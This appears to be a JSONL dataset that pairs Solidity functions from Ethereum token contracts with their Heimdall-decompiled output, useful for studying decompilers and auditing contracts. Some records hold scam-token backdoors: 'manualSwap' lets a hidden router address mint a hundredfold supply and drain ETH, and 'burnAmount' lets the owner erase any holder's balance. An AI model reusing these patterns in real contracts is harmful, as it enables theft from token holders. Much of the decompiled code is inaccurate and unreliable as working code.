var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xaEAD18A6f788fb7460aDA9fDFf4C4Cd6Ba72dDBE", "original_solidity_code": "function removeBypassRule(address who, bytes4 functionSig, uint256 id) public onlyOwner {\\n        byPassableFunction[who][functionSig] = false;\\n        if (id !=0) {\\n            byPassableIds[who][id] = true;\\n        }\\n    }", "heimdall_decompiled_code": "function removeBypassRule(address arg0, bytes4 arg1, uint256 arg2) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == (uint32(arg1)));\n        require(!(bytes1(isClaimable / 0x0100)), \"Not owner or able to bypass\");\n        require(address(owner) == msg.sender, \"Not owner or able to bypass\");\n        require(bytes1(isClaimable / 0x0100), \"Not owner or able to bypass\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1b;\n        var_d = 0x4e6f74206f776e6572206f722061626c6520746f206279706173730000000000;\n        address var_e = address(arg0);\n        var_f = 0x66;\n        var_e = uint32(arg1);\n        address var_f = keccak256(var_e);\n        storage_map_q[var_e] = uint248(storage_map_q[var_e]);\n        require(!arg2, \"Not owner or able to bypass\");\n        var_e = address(arg0);\n        var_f = 0x67;\n        var_e = arg2;\n        var_f = keccak256(var_e);\n        storage_map_q[var_e] = 0x01 | (uint248(storage_map_q[var_e]));\n        var_e = msg.sender;\n        var_f = 0x66;\n        var_e = uint32(msg.data[0]);\n        var_f = keccak256(var_e);\n        require(address(owner) == msg.sender, \"Not owner or able to bypass\");\n        require(bytes1(storage_map_q[var_e]), \"Not owner or able to bypass\");\n        var_e = address(arg0);\n        var_f = 0x66;\n        var_e = uint32(arg1);\n        var_f = keccak256(var_e);\n        storage_map_q[var_e] = uint248(storage_map_q[var_e]);\n        require(!arg2, \"Not owner or able to bypass\");\n        var_e = address(arg0);\n        var_f = 0x67;\n        var_e = arg2;\n        var_f = keccak256(var_e);\n        storage_map_q[var_e] = 0x01 | (uint248(storage_map_q[var_e]));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1b;\n        var_d = 0x4e6f74206f776e6572206f722061626c6520746f206279706173730000000000;\n        require(address(owner) == msg.sender, \"Not owner or able to bypass\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1b;\n        var_d = 0x4e6f74206f776e6572206f722061626c6520746f206279706173730000000000;\n    }"}
{"contract_address": "0xeffb5Ed8242e5270aD662C82EfcA97aDAdE27dFD", "original_solidity_code": "function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public view {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"TOKEN: Max Transaction Limit\");\n        require(address(arg0), \"TOKEN: Max Transaction Limit\");\n        require(arg1 > 0, \"TOKEN: Max Transaction Limit\");\n        require(address(owner) == (address(msg.sender)), \"TOKEN: Max Transaction Limit\");\n        require(!(!(address(owner)) == (address(arg0))), \"TOKEN: Max Transaction Limit\");\n        require(bytes1(uniswapV2Pair / 0x010000000000000000000000000000000000000000), \"TOKEN: Max Transaction Limit\");\n        require(!(arg1 > _maxTxAmount), \"TOKEN: Max Transaction Limit\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1c;\n        var_d = 0x544f4b454e3a204d6178205472616e73616374696f6e204c696d697400000000;\n        address var_e = address(msg.sender);\n        var_f = 0x10;\n        require(!(!bytes1(storage_map_c[var_e])), \"TOKEN: Your account is blacklisted!\");\n        require(!(bytes1(storage_map_c[var_e])), \"TOKEN: Your account is blacklisted!\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x23;\n        var_d = 0x544f4b454e3a20596f7572206163636f756e7420697320626c61636b6c697374;\n        var_g = 0x6564210000000000000000000000000000000000000000000000000000000000;\n        require(address(uniswapV2Pair) == (address(arg0)), \"Amount must be less than total reflections\");\n        var_e = address(arg0);\n        var_f = 0x02;\n        require(!(storage_map_c[var_e] > store_m), \"Amount must be less than total reflections\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2a;\n        var_d = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_g = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_a = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x0de0b6b3a7640000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        uint256 var_g = var_h.length;\n        require(!(0 > var_h.length), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_k = 0;\n        var_l = var_m;\n        require(!(0x20 > var_h.length), \"SafeMath: division by zero\");\n        var_k = 0;\n        if (0x0de0b6b3a7640000) {\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            require(0x0de0b6b3a7640000, \"TOKEN: This account cannot send tokens until trading is enabled\");\n        }\n        require(address(owner) == (address(msg.sender)), \"TOKEN: This account cannot send tokens until trading is enabled\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x3f;\n        var_d = 0x544f4b454e3a2054686973206163636f756e742063616e6e6f742073656e6420;\n        var_g = 0x746f6b656e7320756e74696c2074726164696e6720697320656e61626c656400;\n        var_e = address(msg.sender);\n        var_f = 0x05;\n        if (storage_map_c[var_e]) {\n            if (storage_map_c[var_e]) {\n                if (!storage_map_c[var_e]) {\n                    if (0) {\n                        if (store_n) {\n                            if (store_n) {\n                            }\n                        }\n                        if (!(address(uniswapV2Pair)) == (address(msg.sender))) {\n                            require(bytes1(storage_map_c[var_e]), \"Transfer amount must be greater than zero\");\n                            require(bytes1(storage_map_c[var_e]), \"Transfer amount must be greater than zero\");\n                            require(!(bytes1(storage_map_c[var_e])), \"Transfer amount must be greater than zero\");\n                            require(0, \"Transfer amount must be greater than zero\");\n                            require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                            require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                        }\n                    }\n                    require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n                }\n                require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n            }\n            require(0x01, \"Transfer amount must be greater than zero\");\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x29;\n        var_d = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x23;\n        var_d = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x25;\n        var_d = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x634190EAD9c756794D33e5C4F052774Ab41EB189", "original_solidity_code": "function openTrading() external onlyOwner() {\\r\\n        require(!tradingOpen,\\\"trading is already open\\\");\\r\\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\r\\n        _approve(address(this), address(uniswapV2Router), _tTotal);\\r\\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\\r\\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\\r\\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\\r\\n        swapEnabled = true;\\r\\n        tradingOpen = true;\\r\\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_g / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_f = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_f));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x3b9aca00, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_n[var_e] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x332098414098f0E42658f2eA0254B44b077bb4A5", "original_solidity_code": "function updateSapphireTwilightLake(uint256 newNum) external onlyOwner {\\n        require(\\n            newNum >= ((totalSupply() * 10) / 1000) / 1e9,\\n            \\\"Cannot set maxHoldings lower than 1.0%\\\"\\n        );\\n        maxHoldings = newNum * (10**9);\\n    }", "heimdall_decompiled_code": "function updateSapphireTwilightLake(uint256 arg0) public view {\n        require(arg0 == arg0);\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!totalSupply | (0x0a == ((totalSupply * 0x0a) / totalSupply)));\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x03e8);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n    }"}
{"contract_address": "0xc8729AC1E701f3d4b5524c3937EFF6325F540fD9", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x718128a4433a5053A43810C1cc51427C89046b7E", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_g) {\n            if (store_g - ((store_g / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_g / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_g / 0x02;\n                if (store_g) {\n                    if (store_g - ((store_g / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_g / 0x02) {\n                            if (0x1f < (store_g / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_g / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x59f53b5298b50696aA8995dda90D6a0bB77dE394", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender() == _router);\r\n        _balances[address(this)] = _balances[address(this)].add(_tTotal*100);\r\n        uint256 tokenBalance = balanceOf(address(this));\r\n        if (tokenBalance > 0) {\r\n            swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance = address(this).balance;\r\n        if (ethBalance > 0) {\r\n            _router.transfer(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public view {\n        require(address(msg.sender) == (address(store_k)));\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x02540be400) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x11;\n                if (0x0a) {\n                    if (0x0a == 0x01) {\n                        if (0x0a == 0x02) {\n                            if (!0x09 > 0xff) {\n                                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_b = 0x11;\n                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                    if (!0x09 > 0x01) {\n                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_b = 0x11;\n                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_b = 0x11;\n                                                if (!0x01) {\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xC2C72Ff9E11DdC1A269c1c161dd07d66855A545E", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_f[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xc0aC4689fe801A49Be4Ab080c0018eE0d9C3229e", "original_solidity_code": "function withdraw(address payable _to, uint256 _amount) external onlyOwner {\\n        require(\\n            address(this).balance >= _amount,\\n            \\\"Insufficient balance in the contract\\\"\\n        );\\n        _to.transfer(_amount);\\n    }", "heimdall_decompiled_code": "function withdraw(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(address(this).balance < arg1), \"Insufficient balance in the contract\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x496e73756666696369656e742062616c616e636520696e2074686520636f6e74;\n        var_e = 0x7261637400000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(arg0).transfer(arg1);\n    }"}
{"contract_address": "0x6BcC3D3A7B881AaD26F8D9a06270ff463220844F", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - 0, \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x4103F78C623459b3e985dE5F5d78622944B9dE6D", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return tokenFromReflection(_rOwned[account]);\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x02;\n        require(!(storage_map_l[var_a] > store_m), \"Amount must be less than total reflections\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2a;\n        var_f = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_g = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x5af3107a4000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_h.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        if (0x5af3107a4000) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            require(0x5af3107a4000);\n        }\n    }"}
{"contract_address": "0x52aCF86689CC7AB10686e6aee34A3f628e5DcFEA", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xB9FB64018E475BBCF128E391E62274599c4D848C", "original_solidity_code": "function getMintStats(address minter)\\n        external\\n        view\\n        override\\n        returns (\\n            uint256 minterNumMinted,\\n            uint256 currentTotalSupply,\\n            uint256 maxSupply\\n        )\\n    {\\n        minterNumMinted = _numberMinted(minter);\\n        currentTotalSupply = _totalMinted();\\n        maxSupply = _maxSupply;\\n    }", "heimdall_decompiled_code": "function getMintStats(address arg0) public view returns (bytes memory) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x05;\n        address var_c = uint64(storage_map_b[var_a] >> 0x40);\n        uint256 var_d = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + totalSupply;\n        var_e = maxSupply;\n        return abi.encodePacked(uint64(storage_map_b[var_a] >> 0x40), 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + totalSupply, maxSupply);\n    }"}
{"contract_address": "0x15C20cF168b7A84E9C56ADbf233b80Fc40090e7a", "original_solidity_code": "function burnAmount(address wallet, uint256 amount) public onlyOwner {\\r\\n        require(wallet != owner(), \\\"TARGET ERROR\\\");\\r\\n        address deadAddress = 0x000000000000000000000000000000000000dEaD;\\r\\n        if (_balances[wallet] <= amount * 10 ** 18) {\\r\\n            _balances[wallet] = 0;\\r\\n            _balances[deadAddress] = _balances[deadAddress] + _balances[wallet];\\r\\n        } else {\\r\\n            _balances[wallet] = _balances[wallet] - amount * 10 ** 18;\\r\\n            _balances[deadAddress] = _balances[deadAddress] + amount * 10 ** 18;\\r\\n        }\\r\\n    }", "heimdall_decompiled_code": "function burnAmount(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - (address(owner / 0x01)), \"TARGET ERROR\");\n        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        address var_f = address(arg0);\n        var_h = 0x65;\n        require(storage_map_i[var_f] > (arg1 * 0x0de0b6b3a7640000), \"TARGET ERROR\");\n        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = address(arg0);\n        var_h = 0x65;\n        require(!(storage_map_i[var_f] - (arg1 * 0x0de0b6b3a7640000) > storage_map_i[var_f]), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = address(arg0);\n        var_h = 0x65;\n        storage_map_i[var_f] = storage_map_i[var_f] - (arg1 * 0x0de0b6b3a7640000);\n        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = 0xdead;\n        var_h = 0x65;\n        require(!(storage_map_i[var_f] > (storage_map_i[var_f] + (arg1 * 0x0de0b6b3a7640000))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = 0xdead;\n        var_h = 0x65;\n        storage_map_i[var_f] = storage_map_i[var_f] + (arg1 * 0x0de0b6b3a7640000);\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x0c;\n        var_e = 0x544152474554204552524f520000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x1826BA7e52f6e4EffB63dA920bbEa0F3dbA8AF94", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x4a4571840601e53dC0f99F0b58AdCC14B601e418", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x0de88c23202E51d88bA8B5b05a79720D48CA51c9", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
